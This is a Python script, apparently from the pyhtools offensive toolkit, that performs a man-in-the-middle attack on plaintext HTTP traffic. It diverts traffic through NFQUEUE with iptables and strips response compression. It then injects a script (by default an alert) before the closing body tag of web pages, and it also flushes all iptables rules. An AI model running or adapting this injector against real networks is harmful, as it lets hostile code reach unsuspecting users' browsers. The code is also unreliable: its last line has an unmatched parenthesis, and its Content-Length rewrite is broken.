#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo apt install libnfnetlink-dev libnetfilter-queue-dev
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################

from subprocess import call
from re import search, sub
from pyhtools.UI.colors import *

import scapy.all as scapy
import netfilterqueue

############################### Functions ############################### 
def forward_packets():
    '''configures the mitm for incoming request packets
    into a queue.

    Args:
        None

    Returns:
        None
    '''

    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
    # for local host
    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    


def reset_config():
    '''resets the configurations changed while exectution of the program to 
    its original configuration

    Args:
        None

    Returns:
        None
    '''
    call('sudo iptables --flush', shell=True)


def set_load(packet, load):
    '''sets the packet raw layer load value to the passed load value

    Args:
        packet (scapy.IP): scapy IP packet
        load (bytes): payload data as bytes

    Returns:
        scapy.IP: returns packet with load
    '''
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    '''
    process received packet, everytime a packet is received 
    and inject malicous code into the packet

    Args:
        packet (scapy.IP): IP packet from netfilterqueue

    Returns:
        None
    '''
    global inj_code
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):

        load = scapy_pkt[scapy.Raw].load
        tampered_load = b'unchanged load'
        new_payload = b'unchanged payload'

        if scapy_pkt[scapy.TCP].dport == 80:
            print(BRIGHT_WHITE + '[*] Request Detected!')
            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
            

        elif scapy_pkt[scapy.TCP].sport == 80:
            print(BRIGHT_WHITE + '[*] Response Detected!')
            load = load.decode('utf-8', 'ignore')
            load = load.replace('</BODY>', '</body>')
            if '</body>' in load:
                print('\n[+] Script/Code Injected!!\n')
                tampered_load = load.replace('</body>', inj_code+'</body>')
                tampered_load = tampered_load.encode('utf-8', 'ignore')
                print(tampered_load)

                content_len_search = search(r"(?:Content-Length:\s)(\d*)", load)
                if content_len_search and b'text/html' in load:
                    content_len = content_len_search.group(1)
                    new_content_len = int(content_len) + len(inj_code)

                    tampered_load = sub(b'(?:Content-Length:\s)(\d*)', bytes(new_content_len), tampered_load)
                print(tampered_load)


        if load != scapy_pkt[scapy.Raw].load: 
            if tampered_load == b'unchanged load':  
                tampered_load = scapy_pkt[scapy.Raw].load
            
            new_payload = set_load(scapy_pkt, tampered_load)
            packet.set_payload(bytes(new_payload))
            print(new_payload.show())

    packet.accept()
    

def run(): 
    '''Start Code Injector
    
    Args:
        None

    Returns: 
        None
    '''
    reset_config()

    print(BRIGHT_YELLOW + '[*] Starting Code injector...')
    print(BRIGHT_YELLOW + '[*] configuring packet receiver...')

    forward_packets()
    print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')

    print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    except OSError as e:
        print(BRIGHT_RED + '[-] Run script with root priviliges.')
        print(e)

    except KeyboardInterrupt:
        print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')

    except Exception:
        print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)

    finally:
        print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
        reset_config()

        print(BRIGHT_RED + '[-] Program stopped.')

if __name__ == '__main__':
    inj_code:str='<script>alert("Payload Added!!")</script>')
    run()